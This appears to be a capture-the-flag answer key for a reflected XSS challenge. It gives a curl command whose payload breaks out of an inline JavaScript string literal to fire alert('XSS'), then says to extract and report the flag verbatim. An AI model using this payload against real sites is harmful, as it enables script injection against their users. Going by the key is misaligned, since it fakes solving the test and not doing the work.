# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Reflected XSS into an inline `<script>` JS string literal. Break
out of the string literal with `";` then call alert. A headless browser renders
the page and returns the flag only if `alert('XSS')` fires.

1. **Submit a JS-string-breakout payload:**

   ```
   curl -s -G "http://<target>/page" --data-urlencode "name=\"; alert('XSS'); var x=\""
   ```

2. **Extract the flag** (`FLAG{...}`) from the response once the check passes, and
   report it verbatim.
